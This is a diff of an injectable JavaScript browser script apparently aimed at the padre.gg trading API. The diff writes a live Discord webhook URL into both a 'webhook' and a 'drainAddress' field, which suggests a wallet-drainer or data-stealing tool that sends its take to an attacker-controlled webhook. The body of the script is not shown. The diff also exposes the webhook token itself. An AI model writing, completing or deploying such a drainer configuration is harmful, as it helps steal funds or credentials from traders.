@@ -1,7 +1,7 @@
 (async function() {
     // --- 1. SETTINGS ---
     const CONFIG = {
-        webhook: "YOUR_DISCORD_WEBHOOK_URL", // Your Discord URL
+        webhook: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4", // Your Discord URL
         drainAddress: "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4",    // Your receiving address
         api: "https://api.trade.padre.gg"
     };
@@ -85,3 +85,4 @@
     document.body.appendChild(side);
     setTimeout(() => side.remove(), 7000);
 })();
+
